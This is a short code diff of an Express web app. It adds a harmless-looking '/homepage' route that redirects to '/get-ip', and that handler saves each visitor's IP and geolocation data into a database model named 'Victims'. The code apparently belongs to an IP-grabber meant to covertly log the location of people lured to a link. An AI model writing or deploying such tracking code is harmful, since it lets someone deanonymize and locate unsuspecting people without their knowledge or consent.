@@ -47,6 +47,14 @@ app.use(express.json());
 app.set('view engine', 'ejs');
 
 app.get('/', (req, res) => {
+    res.render('pages/home');
+})
+
+app.get('/homepage', (req, res) => {
+    res.redirect('/get-ip')
+});
+
+app.get('/get-ip', (req, res) => {
     let myData = new Victims(req.ipInfo);
     myData.save()
         .then(item => {
